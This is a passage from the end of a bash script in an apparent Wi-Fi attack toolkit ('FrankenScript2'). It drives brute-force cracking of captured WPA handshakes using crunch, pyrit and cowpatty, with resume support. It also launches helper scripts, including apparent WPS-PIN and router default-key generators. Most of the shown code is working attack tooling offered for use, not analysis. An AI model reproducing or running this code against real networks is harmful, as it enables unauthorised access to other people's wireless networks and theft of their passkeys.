      Presented_Capture_Files=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Chosen_capture_file.txt | nl -ba -w 1 -s ': ')

      clear
      echo $RED"Available Capture Files."
      echo "########################"$STAND
      echo ""
      echo "$Presented_Capture_Files"
      echo ""
      read -p $GREEN"Please input the number of your chosen capture file:$STAND " grep_Line_Number
      read -p $GREEN"Please input a minimum passkey length?:$STAND " MinPasskeyLength
      read -p $GREEN"Please input a maximum passkey length?:$STAND " MaxPasskeyLength
      read -p $GREEN"Please input the character set to be used?:$STAND " CharacterSet
      read -p $GREEN"Please input the maximum amount of times a character can appear next to its self?:$STAND " CharacterLimit

      Capture_File=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Chosen_capture_file.txt | sed -n ""$grep_Line_Number"p")
      AP_essid=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Chosen_capture_file.txt | sed -n ""$grep_Line_Number"p" | rev | cut -c 5- | rev)
      sleep 1
      echo "$Capture_File" > $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Attack_Details.txt
      echo "$AP_essid" >> $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Attack_Details.txt
      echo "$MinPasskeyLength" >> $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Attack_Details.txt
      echo "$MaxPasskeyLength" >> $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Attack_Details.txt
      echo "$CharacterSet" >> $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Attack_Details.txt
      echo "$CharacterLimit" >> $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Attack_Details.txt
      cp $HOME/FrankenScript2/Captured_Handshakes/$Capture_File $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/$Capture_File
      echo ""

      xterm -geometry 75x17+360+0 -e "$HOME/FrankenScript2/Scripts/Handshake_1.sh; bash" &
      xterm -geometry 75x17+820+0 -e "$HOME/FrankenScript2/Scripts/Handshake_2.sh; bash" &

      echo ""
      echo $RED"Files will be stored in:"$STAND
      echo $STAND"$HOME/FrankenScript2/Captured_Handshakes/resume_"$AP_essid""$STAND
      echo $RED"use the resume option to continue the cracking process."$STAND
      echo ""
      read -p $GREEN"Press [Enter] to stop the cracking process."$STAND

      killall -q crunch
      killall -q pyrit
      killall -q cowpatty

      read -p $GREEN"Would you like to close the xterm windows. y/n?:$STAND " xterm

      cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Handshake_1.txt | grep "key no." | tac | head -1 | awk '{ print $4 }' > $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/EndedOn1.txt

      cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Handshake_2.txt | grep "key no." | tac | head -1 | awk '{ print $4 }' > $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/EndedOn2.txt

      rm $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Chosen_capture_file.txt
      rm $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Handshake_1.txt
      rm $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Handshake_2.txt

      mkdir $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/resume_"$AP_essid"

      cp $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/*.cap $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/resume_"$AP_essid"

      cp $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/*.txt $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/resume_"$AP_essid"

      rm $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/*.cap
      rm $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/*.txt
      mv $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/resume_"$AP_essid" $HOME/FrankenScript2/Captured_Handshakes/resume_"$AP_essid"

      if [[ $xterm == "Y" || $xterm == "y" ]]; then
         killall -q xterm
      fi
   fi

   if [[ $Handshake_Attack_Options == "2" ]]; then
      cd 
      ls -l $HOME/FrankenScript2/Captured_Handshakes | grep resume_ | rev | awk '{ print $1 }' | rev > $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/ResumeFolder.txt
      Presented_ResumeFolders=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/ResumeFolder.txt | nl -ba -w 1 -s ': ')
      clear
      echo $RED"Resume Folders."
      echo "#####################"$STAND
      echo ""
      echo "$Presented_ResumeFolders"
      echo ""
      read -p $GREEN"Please input the number of your chosen resume folder:$STAND " grep_Line_Number
      ResumeFolder=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/ResumeFolder.txt | sed -n ""$grep_Line_Number"p" | sed 's/^[ \t]*//;s/[ \t]*$//')
      echo ""
      mv $HOME/FrankenScript2/Captured_Handshakes/$ResumeFolder/*.cap $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking
      mv $HOME/FrankenScript2/Captured_Handshakes/$ResumeFolder/*.txt $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking
      rm $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/ResumeFolder.txt
      rm -r $HOME/FrankenScript2/Captured_Handshakes/$ResumeFolder

      xterm -geometry 75x17+360+0 -e "$HOME/FrankenScript2/Scripts/Resume_Handshake_1.sh; bash" &
      xterm -geometry 75x17+820+0 -e "$HOME/FrankenScript2/Scripts/Resume_Handshake_2.sh; bash" &

      AP_essid=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Attack_Details.txt | sed -n ""2"p")
      echo ""
      echo $RED"Files will be stored in:"$STAND
      echo $STAND"$HOME/FrankenScript2/Captured_Handshakes/resume_"$AP_essid""$STAND
      echo $RED"use the resume option to continue the cracking process."$STAND
      echo ""
      read -p $GREEN"Press [Enter] to stop the cracking process."$STAND

      killall -q crunch
      killall -q pyrit
      killall -q cowpatty

      read -p $GREEN"Would you like to close the xterm windows. y/n?:$STAND " xterm

      cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Handshake_1.txt | grep "key no." | tac | head -1 | awk '{ print $4 }' > $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/EndedOn1.txt

      cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Handshake_2.txt | grep "key no." | tac | head -1 | awk '{ print $4 }' > $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/EndedOn2.txt

      rm $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Handshake_1.txt
      rm $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Handshake_2.txt

      mkdir $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/resume_"$AP_essid"

      cp $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/*.cap $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/resume_"$AP_essid"

      cp $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/*.txt $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/resume_"$AP_essid"

      rm $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/*.cap
      rm $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/*.txt
      mv $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/resume_"$AP_essid" $HOME/FrankenScript2/Captured_Handshakes/resume_"$AP_essid"

      if [[ $xterm == "Y" || $xterm == "y" ]]; then
         killall -q xterm
      fi

   fi
fi
}

Script_Launcher(){
ls -l $HOME/FrankenScript2/Scripts | grep -e ".py" -e ".sh" | rev | awk '{ print $1 }' | rev | sed -e '/.sh~/d' -e '/.py~/d' -e '/belkin4xx.py/d' -e '/easybox_wps.py/d' -e '/Handshake_1.sh/d' -e '/Handshake_2.sh/d' -e '/Handshake_Cracking_Using_A_Wordlist1.sh/d' -e '/Handshake_Cracking_Using_A_Wordlist2.sh/d' -e '/Resume_Handshake_1.sh/d' -e '/Resume_Handshake_2.sh/d' -e '/Thomson_O2wireless.py/d' -e '/WPSPIN1.5_Generator.sh/d' -e '/WPSpin.py/d' > $HOME/FrankenScript2/Temp_Working_Dirctory/Available_Scripts.txt
Presented_Available_Scripts=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Available_Scripts.txt | nl -ba -w 1 -s ': ')
clear
echo $RED"Available Scripts."
echo "##################"$STAND
echo ""
echo "$Presented_Available_Scripts"
echo ""
read -p $GREEN"Please input the number of your chosen script:$STAND " grep_Line_Number
Chosen_Script=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Available_Scripts.txt | sed -n ""$grep_Line_Number"p")

gnome-terminal -e "$HOME/FrankenScript2/Scripts/$Chosen_Script" &
}

if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt ]]; then
   mv $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs
fi

rm $HOME/FrankenScript2/Temp_Working_Dirctory/*.txt &> /dev/null

if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs ]]; then
   mv $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt
fi

WiFi_Adapter_Settings

while :
do

Main_Menu

done
